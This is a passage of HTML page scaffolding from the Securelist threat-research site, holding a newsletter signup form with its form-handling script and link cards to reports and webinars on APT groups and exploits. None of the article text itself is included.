                        <div class="gform-content-wrapper"><div class='gform_body gform-body'><div id='gform_fields_231955316' class='gform_fields top_label form_sublabel_below description_below'><div id="field_11_1" class="gfield gfield_contains_required field_sublabel_below field_description_below gfield_visibility_visible" ><label class='gfield_label screen-reader-text' for='input_231955316_1' >Email<span class="gfield_required"><span class="gfield_required gfield_required_text">(Required)</span></span></label><div class='ginput_container ginput_container_email'>
                            <input name='input_1' id='input_231955316_1' type='text' value='' class='medium'   placeholder='Email' aria-required="true" aria-invalid="false"  />
                        </div></div><div id="field_11_3" class="gfield js-kaspersky-gform-recaptcha-placeholder gform_hidden field_sublabel_below field_description_below gfield_visibility_hidden" ><div class='ginput_container ginput_container_text'><input name='input_3' id='input_231955316_3' type='hidden' class='gform_hidden'  aria-invalid="false" value='' /></div></div><fieldset id="field_11_2" class="gfield input-without-label label-gdpr gfield_contains_required field_sublabel_below field_description_below gfield_visibility_visible" ><legend class='gfield_label screen-reader-text gfield_label_before_complex'  ><span class="gfield_required"><span class="gfield_required gfield_required_text">(Required)</span></span></legend><div class='ginput_container ginput_container_checkbox'><div class='gfield_checkbox' id='input_231955316_2'><div class='gchoice gchoice_11_2_1'>
								<input class='gfield-choice-input' name='input_2.1' type='checkbox'  value='I agree'  id='choice_231955316_11_2_1'   />
								<label for='choice_231955316_11_2_1' id='label_231955316_11_2_1'>I agree to provide my email address to “AO Kaspersky Lab” to receive information about new posts on the site. I understand that I can withdraw this consent at any time via e-mail by clicking the “unsubscribe” link that I find at the bottom of any e-mail sent to me for the purposes mentioned above.</label>
							</div></div></div></fieldset></div></div>
        <div class='gform_footer top_label'> 	<button type="submit" class="gform_button button" id='gform_submit_button_231955316' value="Sign up">
		<svg class="o-icon o-svg-icon o-svg-large"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="https://securelist.com/wp-content/themes/securelist2020/assets/sprite/icons.svg#icon-envelope"></use></svg>		<span>Subscribe</span>
	</button>

	 <input type='hidden' name='gform_ajax' value='form_id=11&amp;title=&amp;description=&amp;tabindex=0' />
            <input type='hidden' class='gform_hidden' name='is_submit_11' value='1' />
            <input type='hidden' class='gform_hidden' name='gform_submit' value='11' />
            
            <input type='hidden' class='gform_hidden' name='gform_unique_id' value='' />
            <input type='hidden' class='gform_hidden' name='state_11' value='WyJbXSIsImIwODQwZTA2ZGQ0NzYwODcyOTBkZjNmZDM1NDk2Y2ZkIl0=' />
            <input type='hidden' class='gform_hidden' name='gform_target_page_number_11' id='gform_target_page_number_231955316_11' value='0' />
            <input type='hidden' class='gform_hidden' name='gform_source_page_number_11' id='gform_source_page_number_231955316_11' value='1' />
            <input type='hidden' name='gform_random_id' value='231955316' /><input type='hidden' name='gform_field_values' value='securelist_2020_form_location=sidebar' />
            
        </div>
                        </div><p style="display: none !important;" class="akismet-fields-container" data-prefix="ak_"><label>&#916;<textarea name="ak_hp_textarea" cols="45" rows="8" maxlength="100"></textarea></label><input type="hidden" id="ak_js_2" name="ak_js" value="183"/><script>document.getElementById( "ak_js_2" ).setAttribute( "value", ( new Date() ).getTime() );</script></p></form>
                        </div>
                <iframe style='display:none;width:0px;height:0px;' src='about:blank' name='gform_ajax_frame_231955316' id='gform_ajax_frame_231955316' title='This iframe contains the logic required to handle Ajax powered Gravity Forms.'></iframe>
                <script type="text/javascript">
/* <![CDATA[ */
 gform.initializeOnLoaded( function() {gformInitSpinner( 231955316, 'https://securelist.com/wp-content/themes/securelist2020/assets/images/content/ajax-spinner-red.svg' );jQuery('#gform_ajax_frame_231955316').on('load',function(){var contents = jQuery(this).contents().find('*').html();var is_postback = contents.indexOf('GF_AJAX_POSTBACK') >= 0;if(!is_postback){return;}var form_content = jQuery(this).contents().find('#gform_wrapper_231955316');var is_confirmation = jQuery(this).contents().find('#gform_confirmation_wrapper_231955316').length > 0;var is_redirect = contents.indexOf('gformRedirect(){') >= 0;var is_form = form_content.length > 0 && ! is_redirect && ! is_confirmation;var mt = parseInt(jQuery('html').css('margin-top'), 10) + parseInt(jQuery('body').css('margin-top'), 10) + 100;if(is_form){jQuery('#gform_wrapper_231955316').html(form_content.html());if(form_content.hasClass('gform_validation_error')){jQuery('#gform_wrapper_231955316').addClass('gform_validation_error');} else {jQuery('#gform_wrapper_231955316').removeClass('gform_validation_error');}setTimeout( function() { /* delay the scroll by 50 milliseconds to fix a bug in chrome */ jQuery(document).scrollTop(jQuery('#gform_wrapper_231955316').offset().top - mt); }, 50 );if(window['gformInitDatepicker']) {gformInitDatepicker();}if(window['gformInitPriceFields']) {gformInitPriceFields();}var current_page = jQuery('#gform_source_page_number_231955316_11').val();gformInitSpinner( 231955316, 'https://securelist.com/wp-content/themes/securelist2020/assets/images/content/ajax-spinner-red.svg' );jQuery(document).trigger('gform_page_loaded', [231955316, current_page]);window['gf_submitting_231955316'] = false;}else if(!is_redirect){var confirmation_content = jQuery(this).contents().find('.GF_AJAX_POSTBACK').html();if(!confirmation_content){confirmation_content = contents;}setTimeout(function(){jQuery('#gform_wrapper_231955316').replaceWith(confirmation_content);jQuery(document).scrollTop(jQuery('#gf_231955316').offset().top - mt);jQuery(document).trigger('gform_confirmation_loaded', [231955316]);window['gf_submitting_231955316'] = false;wp.a11y.speak(jQuery('#gform_confirmation_message_231955316').text());}, 50);}else{jQuery('#gform_231955316').append(contents);if(window['gformRedirect']) {gformRedirect();}}jQuery(document).trigger('gform_post_render', [231955316, current_page]);} );} ); 
/* ]]> */
</script>
					</div>
				</div>
			</div>
					<div class="c-widget__wrapper">
			<div class="js-sticky-widget">
				<p><span class="c-tag c-tag--primary">In the same category</span></p>
				<div class="o-row o-row--small-gutters">
							<div class="o-col-12 c-card__dividers c-card__dividers--hide-first@xs c-card__dividers--show-last@xs">
			<article class="c-card c-card--hor-reverse@xs u-items-center">
		<a   href="https://securelist.com/careto-is-back/114942/" class="c-card__figure" style="">
		<img width="800" height="450" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/12/12093659/SL-Careto-featured-800x450.jpg" class="attachment-securelist-2020-thumbnail size-securelist-2020-thumbnail wp-post-image" alt="" decoding="async" loading="lazy" data-src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/12/12093659/SL-Careto-featured-800x450.jpg" data-srcset="" srcset="" />	</a>
		<div class="c-card__body">
		<header class="c-card__header">
		
		
			<h3 class="c-card__title"><a   href="https://securelist.com/careto-is-back/114942/" class="c-card__link">Careto is back: what&#8217;s new after 10 years of silence?</a></h3>		</header>
					</div>
</article>
		</div>
					<div class="o-col-12 c-card__dividers c-card__dividers--hide-first@xs c-card__dividers--show-last@xs">
			<article class="c-card c-card--hor-reverse@xs u-items-center">
		<a   href="https://securelist.com/apt-report-q3-2024/114623/" class="c-card__figure" style="">
		<img width="800" height="450" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/11/27181956/SL-APT-report-Q3-2024-featured-2-800x450.jpg" class="attachment-securelist-2020-thumbnail size-securelist-2020-thumbnail wp-post-image" alt="" decoding="async" loading="lazy" data-src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/11/27181956/SL-APT-report-Q3-2024-featured-2-800x450.jpg" data-srcset="" srcset="" />	</a>
		<div class="c-card__body">
		<header class="c-card__header">
		
		
			<h3 class="c-card__title"><a   href="https://securelist.com/apt-report-q3-2024/114623/" class="c-card__link">APT trends report Q3 2024</a></h3>		</header>
					</div>
</article>
		</div>
					<div class="o-col-12 c-card__dividers c-card__dividers--hide-first@xs c-card__dividers--show-last@xs">
			<article class="c-card c-card--hor-reverse@xs u-items-center">
		<a   href="https://securelist.com/sidewinder-apt/114089/" class="c-card__figure" style="">
		<img width="800" height="450" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/10/11172712/SL-SideWinder-StealerBot-featured-800x450.jpg" class="attachment-securelist-2020-thumbnail size-securelist-2020-thumbnail wp-post-image" alt="" decoding="async" loading="lazy" data-src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/10/11172712/SL-SideWinder-StealerBot-featured-800x450.jpg" data-srcset="" srcset="" />	</a>
		<div class="c-card__body">
		<header class="c-card__header">
		
		
			<h3 class="c-card__title"><a   href="https://securelist.com/sidewinder-apt/114089/" class="c-card__link">Beyond the Surface: the evolution and expansion of the SideWinder APT group</a></h3>		</header>
					</div>
</article>
		</div>
					<div class="o-col-12 c-card__dividers c-card__dividers--hide-first@xs c-card__dividers--show-last@xs">
			<article class="c-card c-card--hor-reverse@xs u-items-center">
		<a   href="https://securelist.com/blindeagle-apt/113414/" class="c-card__figure" style="">
		<img width="800" height="450" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/08/16173535/SL-BlindEagle-featured-800x450.jpg" class="attachment-securelist-2020-thumbnail size-securelist-2020-thumbnail wp-post-image" alt="" decoding="async" loading="lazy" data-src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/08/16173535/SL-BlindEagle-featured-800x450.jpg" data-srcset="" srcset="" />	</a>
		<div class="c-card__body">
		<header class="c-card__header">
		
		
			<h3 class="c-card__title"><a   href="https://securelist.com/blindeagle-apt/113414/" class="c-card__link">BlindEagle flying high in Latin America</a></h3>		</header>
					</div>
</article>
		</div>
					<div class="o-col-12 c-card__dividers c-card__dividers--hide-first@xs c-card__dividers--show-last@xs">
			<article class="c-card c-card--hor-reverse@xs u-items-center">
		<a   href="https://securelist.com/eastwind-apt-campaign/113345/" class="c-card__figure" style="">
		<img width="800" height="450" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/08/14084410/SL-EastWind-targeted-attack-featured-800x450.jpg" class="attachment-securelist-2020-thumbnail size-securelist-2020-thumbnail wp-post-image" alt="" decoding="async" loading="lazy" data-src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/08/14084410/SL-EastWind-targeted-attack-featured-800x450.jpg" data-srcset="" srcset="" />	</a>
		<div class="c-card__body">
		<header class="c-card__header">
		
		
			<h3 class="c-card__title"><a   href="https://securelist.com/eastwind-apt-campaign/113345/" class="c-card__link">EastWind campaign: new CloudSorcerer attacks on government organizations in Russia</a></h3>		</header>
					</div>
</article>
		</div>
							</div>
			</div>
		</div>
		<li id="text-22" class="widget widget_text">			<div class="textwidget"><p><a href="https://www.brighttalk.com/webcast/15591/631709?icid=gl_securelist_acq_ona_smm__onl_b2b_securelist_ban_sm-team_______062b129a403dba5e" target="_blank" rel="noopener"><img decoding="async" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/12/12141214/crimeware_webinar_310x420.png" width="370" /></a></p>
</div>
		</li>
									</div>
								</div>

							</div>
						</div>

						<div class="c-article__progress rpi-progress-bar">
							<div class="c-article__progress-bar__position rpi-progress-bar__position"></div>
							<div class="rpi-progress-bar__percentage"></div>
						</div>
					</article>
				</div>
			</section>
			<section class="c-block c-block--spacing-t-small c-block--spacing-b-small@md c-block--divider-internal">
	<div class="o-container-fluid">
		<h5 class="c-block__title">Latest Posts</h5>
		<div class="o-row o-row--small-gutters@sm c-card__row c-card__row--fixed-width-down@sm js-slider-posts-mobile">
					<div class="o-col-6@sm o-col-3@md">
			<article class="c-card c-card--standard@xs">
		<a   href="https://securelist.com/ksb-story-of-the-year-2024/114883/" class="c-card__figure" style="">
		<img width="800" height="450" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/12/09090421/ksb-2025-story-of-the-year-featured-800x450.jpg" class="attachment-securelist-2020-thumbnail size-securelist-2020-thumbnail wp-post-image" alt="" decoding="async" loading="lazy" data-src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/12/09090421/ksb-2025-story-of-the-year-featured-800x450.jpg" data-srcset="" srcset="" />	</a>
		<div class="c-card__body">
		<header class="c-card__header">
					<p class="c-card__headline u-hidden u-block@md">
				<a  href="https://securelist.com/category/kaspersky-security-bulletin/" class="c-tag c-tag--primary">Kaspersky Security Bulletin</a>
			</p>
		
		
			<h3 class="c-card__title"><a   href="https://securelist.com/ksb-story-of-the-year-2024/114883/" class="c-card__link">Story of the Year: global IT outages and supply chain attacks</a></h3>		</header>
						<footer class="c-card__footer">
			<div class="c-card__authors">
				<ul class="c-list-authors c-list-authors--comma">
								<li>
			<a  href="https://securelist.com/author/alexanderliskin/" >
						<span>Alexander Liskin</span></a>
		</li>
			<li>
			<a  href="https://securelist.com/author/vladimirkuskov/" >
						<span>Vladimir Kuskov</span></a>
		</li>
			<li>
			<a  href="https://securelist.com/author/igorsoumenkov/" >
						<span>Igor Kuznetsov</span></a>
		</li>
			<li>
			<a  href="https://securelist.com/author/vitalykamluk/" >
						<span>Vitaly Kamluk</span></a>
		</li>
						</ul>
			</div>
		</footer>
			</div>
</article>
		</div>
					<div class="o-col-6@sm o-col-3@md">
			<article class="c-card c-card--standard@xs">
		<a   href="https://securelist.com/exploits-and-vulnerabilities-q3-2024/114839/" class="c-card__figure" style="">
		<img width="800" height="450" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/12/06081001/SL-vulnerability-exploit-report-q3-2024-featured-800x450.jpg" class="attachment-securelist-2020-thumbnail size-securelist-2020-thumbnail wp-post-image" alt="" decoding="async" loading="lazy" data-src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/12/06081001/SL-vulnerability-exploit-report-q3-2024-featured-800x450.jpg" data-srcset="" srcset="" />	</a>
		<div class="c-card__body">
		<header class="c-card__header">
					<p class="c-card__headline u-hidden u-block@md">
				<a  href="https://securelist.com/category/vulnerability-reports/" class="c-tag c-tag--primary">Vulnerability reports</a>
			</p>
		
		
			<h3 class="c-card__title"><a   href="https://securelist.com/exploits-and-vulnerabilities-q3-2024/114839/" class="c-card__link">Exploits and vulnerabilities in Q3 2024</a></h3>		</header>
						<footer class="c-card__footer">
			<div class="c-card__authors">
				<ul class="c-list-authors c-list-authors--comma">
								<li>
			<a  href="https://securelist.com/author/alexanderalkolesnikov/" >
						<span>Alexander Kolesnikov</span></a>
		</li>
						</ul>
			</div>
		</footer>
			</div>
</article>
		</div>
					<div class="o-col-6@sm o-col-3@md">
			<article class="c-card c-card--standard@xs">
		<a   href="https://securelist.com/hrtng-ida-pro-plugin/114780/" class="c-card__figure" style="">
		<img width="800" height="450" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/12/05092559/SL-hrtng-IDA-Pro-plugin-featured-800x450.jpg" class="attachment-securelist-2020-thumbnail size-securelist-2020-thumbnail wp-post-image" alt="" decoding="async" loading="lazy" data-src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/12/05092559/SL-hrtng-IDA-Pro-plugin-featured-800x450.jpg" data-srcset="" srcset="" />	</a>
		<div class="c-card__body">
		<header class="c-card__header">
					<p class="c-card__headline u-hidden u-block@md">
				<a  href="https://securelist.com/category/software/" class="c-tag c-tag--primary">Software</a>
			</p>
		
		
			<h3 class="c-card__title"><a   href="https://securelist.com/hrtng-ida-pro-plugin/114780/" class="c-card__link">Our secret ingredient for reverse engineering</a></h3>		</header>
						<footer class="c-card__footer">
			<div class="c-card__authors">
				<ul class="c-list-authors c-list-authors--comma">
								<li>
			<a  href="https://securelist.com/author/georgykucherin/" >
						<span>Georgy Kucherin</span></a>
		</li>
						</ul>
			</div>
		</footer>
			</div>
</article>
		</div>
					<div class="o-col-6@sm o-col-3@md">
			<article class="c-card c-card--standard@xs">
		<a   href="https://securelist.com/ksb-2024-statistics/114795/" class="c-card__figure" style="">
		<img width="800" height="450" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/12/04134048/KSB-2024-statistics-featured-2-800x450.jpg" class="attachment-securelist-2020-thumbnail size-securelist-2020-thumbnail wp-post-image" alt="" decoding="async" loading="lazy" data-src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/12/04134048/KSB-2024-statistics-featured-2-800x450.jpg" data-srcset="" srcset="" />	</a>
		<div class="c-card__body">
		<header class="c-card__header">
					<p class="c-card__headline u-hidden u-block@md">
				<a  href="https://securelist.com/category/kaspersky-security-bulletin/" class="c-tag c-tag--primary">Kaspersky Security Bulletin</a>
			</p>
		
		
			<h3 class="c-card__title"><a   href="https://securelist.com/ksb-2024-statistics/114795/" class="c-card__link">Kaspersky Security Bulletin 2024. Statistics</a></h3>		</header>
						<footer class="c-card__footer">
			<div class="c-card__authors">
				<ul class="c-list-authors c-list-authors--comma">
								<li>
			<a  href="https://securelist.com/author/amr/" >
						<span>AMR</span></a>
		</li>
						</ul>
			</div>
		</footer>
			</div>
</article>
		</div>
					</div>
	</div>
</section>
	<section class="c-block c-block--spacing-t-small c-block--spacing-b-small@md c-block--divider-internal" data-element-id="latest-webinars-post-section">
		<div class="o-container-fluid">
			<h5 class="c-block__title">Latest Webinars</h5>
			<div class="o-row o-row--small-gutters@sm c-card__row c-card__row--fixed-width-down@sm js-slider-posts-mobile">
														<div class="o-col-6@sm o-col-3@md">
						<article class="c-card c-card--standard@xs">
	<div class="c-card__figure">
		<a href="https://securelist.com/webinars/inside-the-dark-web-exploring-the-human-side-of-cybercriminals/" class="c-card__figure-link" data-element-id="latest-webinars-post-image">
							<img width="800" height="450" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/09/10125625/cybercriminal-portrait-webinar-800x450.png" class="attachment-securelist-2020-thumbnail size-securelist-2020-thumbnail" alt="" title="" decoding="async" loading="lazy" data-src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/09/10125625/cybercriminal-portrait-webinar-800x450.png" data-srcset="" srcset="" />								</a>
	</div>
	<div class="c-card__body">
		<header class="c-card__header">
					<p class="c-card__headline">
				<a href="https://securelist.com/webinar-category/threat-intelligence-and-incident-response/" class="c-tag c-tag--primary c-tag--has-icon" data-element-id="latest-webinars-post-category"><span class="c-tag__icon"><svg class="o-icon o-svg-icon o-svg-larger"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="https://securelist.com/wp-content/themes/securelist2020/assets/sprite/icons.svg#icon-webinar"></use></svg></span>Threat intelligence and IR</a>
			</p>
											<div class="u-flex u-justify-between">
					<time datetime="2024-09-04T17:00:00+00:00" class="c-card__event-date">
												04 Sep 2024, 5:00pm					</time>
					<span class="c-card__event-date">60 min</span>
				</div>
								<h3 class="c-card__title"><a href="https://securelist.com/webinars/inside-the-dark-web-exploring-the-human-side-of-cybercriminals/" class="c-card__link" data-element-id="latest-webinars-post-title">Inside the Dark Web: exploring the human side of cybercriminals</a></h3>
		</header>
				<footer class="c-card__footer">
			<div class="c-card__authors">
				<ul class="c-list-authors c-list-authors--comma">
								<li>
			<a  href="https://securelist.com/author/annapavlovskaya/" data-element-id="latest-webinars-post-author">
						<span>Anna Pavlovskaya</span></a>
		</li>
						</ul>
			</div>
		</footer>
	</div>
</article>
					</div>
													<div class="o-col-6@sm o-col-3@md">
						<article class="c-card c-card--standard@xs">
	<div class="c-card__figure">
		<a href="https://securelist.com/webinars/the-cybersecurity-buyers-dilemma-hype-vs-true-expertise/" class="c-card__figure-link" data-element-id="latest-webinars-post-image">
							<img width="800" height="450" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/08/27144737/expertise-center-webinar-800x450.jpg" class="attachment-securelist-2020-thumbnail size-securelist-2020-thumbnail" alt="" title="" decoding="async" loading="lazy" srcset="" sizes="(max-width: 800px) 100vw, 800px" data-src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/08/27144737/expertise-center-webinar-800x450.jpg" data-srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/08/27144737/expertise-center-webinar-800x450.jpg 800w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/08/27144737/expertise-center-webinar-300x168.jpg 300w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/08/27144737/expertise-center-webinar-500x280.jpg 500w" />								</a>
	</div>
	<div class="c-card__body">
		<header class="c-card__header">
					<p class="c-card__headline">
				<a href="https://securelist.com/webinar-category/technologies-and-services/" class="c-tag c-tag--primary c-tag--has-icon" data-element-id="latest-webinars-post-category"><span class="c-tag__icon"><svg class="o-icon o-svg-icon o-svg-larger"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="https://securelist.com/wp-content/themes/securelist2020/assets/sprite/icons.svg#icon-webinar"></use></svg></span>Technologies and services</a>
			</p>
											<div class="u-flex u-justify-between">
					<time datetime="2024-08-13T17:00:00+00:00" class="c-card__event-date">
												13 Aug 2024, 5:00pm					</time>
					<span class="c-card__event-date">60 min</span>
				</div>
								<h3 class="c-card__title"><a href="https://securelist.com/webinars/the-cybersecurity-buyers-dilemma-hype-vs-true-expertise/" class="c-card__link" data-element-id="latest-webinars-post-title">The Cybersecurity Buyer&#8217;s Dilemma: Hype vs (True) Expertise</a></h3>
		</header>
				<footer class="c-card__footer">
			<div class="c-card__authors">
				<ul class="c-list-authors c-list-authors--comma">
								<li>
			<a  href="https://securelist.com/author/oleggorobets/" data-element-id="latest-webinars-post-author">
						<span>Oleg Gorobets</span></a>
		</li>
			<li>
			<a  href="https://securelist.com/author/alexanderliskin/" data-element-id="latest-webinars-post-author">
						<span>Alexander Liskin</span></a>
		</li>
						</ul>
			</div>
		</footer>
	</div>
</article>
					</div>
													<div class="o-col-6@sm o-col-3@md">
						<article class="c-card c-card--standard@xs">
	<div class="c-card__figure">
		<a href="https://securelist.com/webinars/cybersecuritys-human-factor-more-than-an-unpatched-vulnerability/" class="c-card__figure-link" data-element-id="latest-webinars-post-image">
							<img width="800" height="450" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/08/27140525/human-factor-webinar-01-800x450.jpg" class="attachment-securelist-2020-thumbnail size-securelist-2020-thumbnail" alt="" title="" decoding="async" loading="lazy" srcset="" sizes="(max-width: 800px) 100vw, 800px" data-src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/08/27140525/human-factor-webinar-01-800x450.jpg" data-srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/08/27140525/human-factor-webinar-01-800x450.jpg 800w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/08/27140525/human-factor-webinar-01-300x168.jpg 300w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/08/27140525/human-factor-webinar-01-500x280.jpg 500w" />								</a>
	</div>
	<div class="c-card__body">
		<header class="c-card__header">
					<p class="c-card__headline">
				<a href="https://securelist.com/webinar-category/cyberthreat-talks/" class="c-tag c-tag--primary c-tag--has-icon" data-element-id="latest-webinars-post-category"><span class="c-tag__icon"><svg class="o-icon o-svg-icon o-svg-larger"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="https://securelist.com/wp-content/themes/securelist2020/assets/sprite/icons.svg#icon-webinar"></use></svg></span>Cyberthreat talks</a>
			</p>
											<div class="u-flex u-justify-between">
					<time datetime="2024-07-16T17:00:00+00:00" class="c-card__event-date">
												16 Jul 2024, 5:00pm					</time>
					<span class="c-card__event-date">60 min</span>
				</div>
								<h3 class="c-card__title"><a href="https://securelist.com/webinars/cybersecuritys-human-factor-more-than-an-unpatched-vulnerability/" class="c-card__link" data-element-id="latest-webinars-post-title">Cybersecurity&#8217;s human factor – more than an unpatched vulnerability</a></h3>
		</header>
				<footer class="c-card__footer">
			<div class="c-card__authors">
				<ul class="c-list-authors c-list-authors--comma">
								<li>
			<a  href="https://securelist.com/author/oleggorobets/" data-element-id="latest-webinars-post-author">
						<span>Oleg Gorobets</span></a>
		</li>
						</ul>
			</div>
		</footer>
	</div>
</article>
					</div>
													<div class="o-col-6@sm o-col-3@md">
						<article class="c-card c-card--standard@xs">
	<div class="c-card__figure">
		<a href="https://securelist.com/webinars/building-and-prioritizing-detection-engineering-backlogs-with-mitre-attck/" class="c-card__figure-link" data-element-id="latest-webinars-post-image">
							<img width="800" height="450" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/07/09100900/sl-detection_backlog_prioritization-featured-800x450.jpg" class="attachment-securelist-2020-thumbnail size-securelist-2020-thumbnail" alt="" title="" decoding="async" loading="lazy" srcset="" sizes="(max-width: 800px) 100vw, 800px" data-src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/07/09100900/sl-detection_backlog_prioritization-featured-800x450.jpg" data-srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/07/09100900/sl-detection_backlog_prioritization-featured-800x450.jpg 800w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/07/09100900/sl-detection_backlog_prioritization-featured-300x168.jpg 300w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/07/09100900/sl-detection_backlog_prioritization-featured-500x280.jpg 500w" />								</a>
	</div>
	<div class="c-card__body">
		<header class="c-card__header">
					<p class="c-card__headline">
				<a href="https://securelist.com/webinar-category/trainings-and-workshops/" class="c-tag c-tag--primary c-tag--has-icon" data-element-id="latest-webinars-post-category"><span class="c-tag__icon"><svg class="o-icon o-svg-icon o-svg-larger"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="https://securelist.com/wp-content/themes/securelist2020/assets/sprite/icons.svg#icon-webinar"></use></svg></span>Trainings and workshops</a>
			</p>
											<div class="u-flex u-justify-between">
					<time datetime="2024-07-09T16:00:00+00:00" class="c-card__event-date">
												09 Jul 2024, 4:00pm					</time>
					<span class="c-card__event-date">60 min</span>
				</div>
								<h3 class="c-card__title"><a href="https://securelist.com/webinars/building-and-prioritizing-detection-engineering-backlogs-with-mitre-attck/" class="c-card__link" data-element-id="latest-webinars-post-title">Building and prioritizing detection engineering backlogs with MITRE ATT&#038;CK</a></h3>
		</header>
				<footer class="c-card__footer">
			<div class="c-card__authors">
				<ul class="c-list-authors c-list-authors--comma">
								<li>
			<a  href="https://securelist.com/author/andreytamoykin/" data-element-id="latest-webinars-post-author">
						<span>Andrey Tamoykin</span></a>
		</li>
						</ul>
			</div>
		</footer>
	</div>
</article>
					</div>
									</div>
		</div>
	</section>
		<section data-element-id="footer-reports-section" class="c-block c-block--spacing-t-small c-block--spacing-b-small@md c-block--divider-internal">
		<div class="o-container-fluid">
			<h5 class="c-block__title">Reports</h5>
			<div class="o-row o-row--small-gutters">
				<div class="o-col-8@sm">
					<div class="o-row o-row--small-gutters">
																							<div class="o-col-6@md">
												<article class="c-card c-card--standard@xs">
		<div class="c-card__body">
		<header class="c-card__header">
		
		
			<h3 class="c-card__title"><a  data-element-id="footer-reports-title"   href="https://securelist.com/careto-is-back/114942/" class="c-card__link">Careto is back: what&#8217;s new after 10 years of silence?</a></h3>		</header>
				<div class="c-card__desc">
			<p>Kaspersky researchers analyze 2019, 2022 and 2024 attacks attributed to Careto APT with medium to high confidence.</p>
		</div>
					</div>
</article>
						</div>
																							<div class="o-col-6@md c-card__dividers c-card__dividers--hide@md">
												<article class="c-card c-card--standard@xs">
		<div class="c-card__body">
		<header class="c-card__header">
		
		
			<h3 class="c-card__title"><a  data-element-id="footer-reports-title"   href="https://securelist.com/apt-report-q3-2024/114623/" class="c-card__link">APT trends report Q3 2024</a></h3>		</header>
				<div class="c-card__desc u-hidden u-block@md">
			<p>The report features the most significant developments relating to APT groups in Q3 2024, including hacktivist activity, new APT tools and campaigns.</p>
		</div>
					</div>
</article>
						</div>
																							<div class="o-col-6@md c-card__dividers c-card__dividers--hide@md">
												<article class="c-card c-card--standard@xs">
		<div class="c-card__body">
		<header class="c-card__header">
		
		
			<h3 class="c-card__title"><a  data-element-id="footer-reports-title"   href="https://securelist.com/sidewinder-apt/114089/" class="c-card__link">Beyond the Surface: the evolution and expansion of the SideWinder APT group</a></h3>		</header>
				<div class="c-card__desc u-hidden u-block@md">
			<p>Kaspersky analyzes SideWinder APT’s recent activity: new targets in the MiddleEast and Africa, post-exploitation tools and techniques.</p>
		</div>
					</div>
</article>
						</div>
																							<div class="o-col-6@md c-card__dividers c-card__dividers--hide@md">
												<article class="c-card c-card--standard@xs">
		<div class="c-card__body">
		<header class="c-card__header">
		
		
			<h3 class="c-card__title"><a  data-element-id="footer-reports-title"   href="https://securelist.com/blindeagle-apt/113414/" class="c-card__link">BlindEagle flying high in Latin America</a></h3>		</header>
				<div class="c-card__desc u-hidden u-block@md">
			<p>Kaspersky shares insights into the activity and TTPs of the BlindEagle APT, which targets organizations and individuals in Colombia, Ecuador, Chile, Panama and other Latin American countries.</p>
		</div>
					</div>
</article>
						</div>
															</div>
				</div>
								<div class="o-col-4@sm u-hidden u-block@sm">
					<div class="c-image c-image--overflow-down@sm">
						<a href="https://xtraining.kaspersky.com/?icid=gl_securelist_acq_ona_smm__all_b2b_securelist_ban_sm-team___xtraining____9a8b46fb8b50f071"><img src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/12/17081821/Christmas_370x500-1.jpg" /></a>					</div>
				</div>
							</div>
		</div>
	</section>
		<section class="c-block c-block--spacing-t-small c-block--spacing-b-small@md" data-element-id="footer-subscribe-section">
		<div class="o-container-fluid">
			<div class="o-row c-block__row u-flex-nowrap@md">
				<div class="o-col">
					<div class="c-block__header">
						<h5 class="c-block__title">Subscribe to our weekly e-mails</h5>
						<p>The hottest research right in your inbox</p>
					</div>
				</div>
				<div class="o-col u-flex-shrink-0 u-flex-grow">
					<div class="c-form--newsletter u-ml-auto">
						
                <div class='gf_browser_chrome gform_wrapper gform_wrapper_original_id_11 gravity-theme subscribe-mc_wrapper' id='gform_wrapper_2917778541' ><div id='gf_2917778541' class='gform_anchor' tabindex='-1'></div><form method='post' enctype='multipart/form-data' target='gform_ajax_frame_2917778541' id='gform_2917778541' class='subscribe-mc' action='/the-zero-day-exploits-of-operation-wizardopium/97086/#gf_2917778541' >
